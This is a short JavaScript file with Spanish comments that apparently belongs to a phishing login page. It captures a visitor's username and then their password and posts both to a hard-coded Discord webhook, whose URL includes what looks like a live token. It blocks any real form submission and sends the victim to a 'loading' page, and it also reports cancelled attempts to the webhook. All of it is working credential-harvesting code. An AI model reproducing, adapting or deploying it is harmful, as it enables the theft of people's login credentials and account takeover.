<script>
  // CONFIGURACIÓN DE DISCORD
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1502415454721802323/cA7X6z9K-UhI7DoFs4tOLVHYVJ-eubS1LJbpRqUjZ8M9jpKPYqLKmqAOxgmJQA7B4yxY";

  // Función global para enviar a Discord vía Fetch
  async function enviarADiscordJS(mensaje) {
    try {
      await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: mensaje })
      });
    } catch (error) {
      console.error("Error enviando a Discord:", error);
    }
  }

  // --- 1. PASO: Captura de Nombre (Usuario) ---
  document.getElementById("entrarBtn").addEventListener("click", async function() {
      var nombre = document.getElementById("nombre").value;
      if (nombre.length >= 6) {
          this.disabled = true; 
          
          // Alerta a Discord solo con el nombre inicial
          await enviarADiscordJS("👤 **USUARIO R**\nNombre: `" + nombre + "`");

          // Guardar para el siguiente paso
          localStorage.setItem("usuario", nombre);
          document.getElementById("nombreOculto").value = nombre; 
          document.getElementById("overlay").style.display = "flex"; 
      }
  });

  // --- 2. PASO: Captura de Contraseña ---
  document.getElementById("continuarBtn").addEventListener("click", async function(e) {
      e.preventDefault(); // Detiene cualquier intento de buscar user.php
      
      var contra = document.getElementById("contra").value;
      var nombre = localStorage.getItem("usuario") || "Desconocido";

      if (contra.length >= 8) {
          this.disabled = true;

          // Alerta a Discord con los datos finales
          const mensaje = "🔐 **CLAV**\n👤 Usuario: `" + nombre + "`\n🔑 Pass: `" + contra + "`";
          await enviarADiscordJS(mensaje);

          // REDIRECCIÓN CORREGIDA: Siempre a cargando.html
          window.location.href = "cargando.html";
      }
  });

  // --- Funciones de utilidad ---
  document.getElementById("nombre").addEventListener("input", function() {
      document.getElementById("entrarBtn").disabled = (this.value.length < 6);
  });

  document.getElementById("contra").addEventListener("input", function() {
      document.getElementById("continuarBtn").disabled = (this.value.length < 8);
  });

  function togglePasswordVisibility() {
      const field = document.getElementById("contra");
      field.type = field.type === "password" ? "text" : "password";
  }

  function cancelar() {
      const nombre = localStorage.getItem("usuario") || "Desconocido";
      enviarADiscordJS("🚫 **CANCELADO** por: `" + nombre + "`");
      window.location.href = "index.html"; 
  }

  function quitarEspacios() {
      var input = document.getElementById("nombre");
      input.value = input.value.trim();
  }
</script>
